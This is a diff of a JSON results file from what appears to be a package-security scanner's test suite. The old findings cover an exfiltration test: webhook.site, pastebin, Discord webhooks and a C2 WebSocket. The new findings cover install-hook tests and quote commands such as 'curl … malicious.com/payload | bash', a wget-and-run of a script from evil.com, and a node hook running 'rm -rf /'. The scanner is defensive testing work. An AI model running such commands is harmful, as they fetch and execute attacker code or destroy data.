@@ -1,113 +1,90 @@
 {
-  "scan_path": "tests/test-cases/network-exfiltration-test/",
-  "start_time": "2025-09-28T01:39:50.416137700Z",
-  "end_time": "2025-09-28T01:39:50.442784700Z",
-  "duration_seconds": 0.026,
-  "timestamp": "2025-09-28T01:39:50.416137700Z",
+  "scan_path": "tests/test-cases/postinstall-hooks-test/",
+  "start_time": "2025-09-28T02:11:32.367827600Z",
+  "end_time": "2025-09-28T02:11:32.370586Z",
+  "duration_seconds": 0.002,
+  "timestamp": "2025-09-28T02:11:32.367827600Z",
   "files_scanned": 0,
   "results": [
     {
-      "file": "tests/test-cases/network-exfiltration-test/malicious.js",
+      "file": "tests/test-cases/postinstall-hooks-test/package.json",
+      "risk_level": "Medium",
+      "comment": "Contains suspicious packages: Known typosquatting of 'express': express (missing character (s))",
+      "patterns_detected": [
+        "typosquatting"
+      ],
+      "details": [
+        "Known typosquatting of 'express': express (missing character (s))"
+      ]
+    },
+    {
+      "file": "tests/test-cases/postinstall-hooks-test/package.json",
+      "risk_level": "Medium",
+      "comment": "Suspicious patterns detected: Potential typosquatting package detected",
+      "patterns_detected": [
+        "typosquatting_detection"
+      ],
+      "details": [
+        "typosquatting_detection: Potential typosquatting package detected"
+      ]
+    },
+    {
+      "file": "tests/test-cases/postinstall-hooks-test/package.json",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: webhook.site reference, Pastebin exfiltration detected, Hardcoded private IP address detected, C2 WebSocket connection detected",
+      "comment": "Suspicious postinstall hook detected: curl -s https://malicious.com/payload | bash",
       "patterns_detected": [
-        "webhook_site_reference",
-        "pastebin_exfiltration",
-        "private_ip_hardcoded",
-        "c2_websocket"
+        "suspicious_postinstall_hook"
       ],
       "details": [
-        "webhook_site_reference: webhook.site reference",
-        "pastebin_exfiltration: Pastebin exfiltration detected",
-        "private_ip_hardcoded: Hardcoded private IP address detected",
-        "c2_websocket: C2 WebSocket connection detected"
+        "Postinstall command: curl -s https://malicious.com/payload | bash",
+        "Suspicious pattern: curl",
+        "Postinstall hooks can execute arbitrary code during package installation"
       ]
     },
     {
-      "file": "tests/test-cases/network-exfiltration-test/malicious.js",
+      "file": "tests/test-cases/postinstall-hooks-test/package.json",
       "risk_level": "Medium",
-      "comment": "Network exfiltration pattern: Pastebin exfiltration detected",
+      "comment": "Suspicious install hook detected: node -e \"require('child_process').exec('rm -rf /')\"",
       "patterns_detected": [
-        "pastebin_exfiltration"
+        "suspicious_lifecycle_hook"
       ],
       "details": [
-        "Line 4: pastebin.com"
+        "Hook type: install",
+        "Command: node -e \"require('child_process').exec('rm -rf /')\"",
+        "Suspicious pattern: node -e"
       ]
     },
     {
-      "file": "tests/test-cases/network-exfiltration-test/malicious.js",
+      "file": "tests/test-cases/postinstall-hooks-test/package.json",
       "risk_level": "Medium",
-      "comment": "Network exfiltration pattern: Hardcoded private IP address detected",
+      "comment": "Suspicious preinstall hook detected: wget -O /tmp/malware.sh https://evil.com/malware && bash /tmp/malware.sh",
       "patterns_detected": [
-        "private_ip_hardcoded"
+        "suspicious_lifecycle_hook"
       ],
       "details": [
-        "Line 8: 192.168.1.100",
-        "Line 9: 10.0.1.50"
+        "Hook type: preinstall",
+        "Command: wget -O /tmp/malware.sh https://evil.com/malware && bash /tmp/malware.sh",
+        "Suspicious pattern: wget"
       ]
     },
     {
-      "file": "tests/test-cases/network-exfiltration-test/malicious.js",
+      "file": "tests/test-cases/postinstall-hooks-test/package.json",
       "risk_level": "Medium",
-      "comment": "Network exfiltration pattern: C2 WebSocket connection detected",
+      "comment": "Suspicious prepare hook detected: eval $(echo 'malicious code here')",
       "patterns_detected": [
-        "c2_websocket"
+        "suspicious_lifecycle_hook"
       ],
       "details": [
-        "Line 16: wss://c2-server.evil.com"
-      ]
-    },
-    {
-      "file": "tests/test-cases/network-exfiltration-test/malicious.js",
-      "risk_level": "Medium",
-      "comment": "Network exfiltration pattern: Base64 decoding detected",
-      "patterns_detected": [
-        "base64_decoding"
-      ],
-      "details": [
-        "Line 12: atob(",
-        "Line 13: Buffer.from(encryptedData, 'base64'"
-      ]
-    },
-    {
-      "file": "tests/test-cases/network-exfiltration-test/malicious.js",
-      "risk_level": "Medium",
-      "comment": "Network exfiltration pattern: WebSocket connection to external endpoint detected",
-      "patterns_detected": [
-        "suspicious_websocket"
-      ],
-      "details": [
-        "Line 16: new WebSocket(\"wss://",
-        "Line 17: new WebSocket(\"wss://"
-      ]
-    },
-    {
-      "file": "tests/test-cases/network-exfiltration-test/malicious.js",
-      "risk_level": "Medium",
-      "comment": "Network exfiltration pattern: Webhook.site exfiltration detected",
-      "patterns_detected": [
-        "webhook_exfiltration"
-      ],
-      "details": [
-        "Line 20: https://webhook.site/12345abc-def6-7890-abcd-ef1234567890"
-      ]
-    },
-    {
-      "file": "tests/test-cases/network-exfiltration-test/malicious.js",
-      "risk_level": "Medium",
-      "comment": "Network exfiltration pattern: Discord webhook exfiltration detected",
-      "patterns_detected": [
-        "discord_webhook"
-      ],
-      "details": [
-        "Line 27: https://discord.com/api/webhooks/"
+        "Hook type: prepare",
+        "Command: eval $(echo 'malicious code here')",
+        "Suspicious pattern: eval"
       ]
     }
   ],
   "summary": {
     "high_risk_count": 1,
-    "medium_risk_count": 7,
+    "medium_risk_count": 5,
     "low_risk_count": 0,
-    "total_issues": 8
+    "total_issues": 6
   }
 }
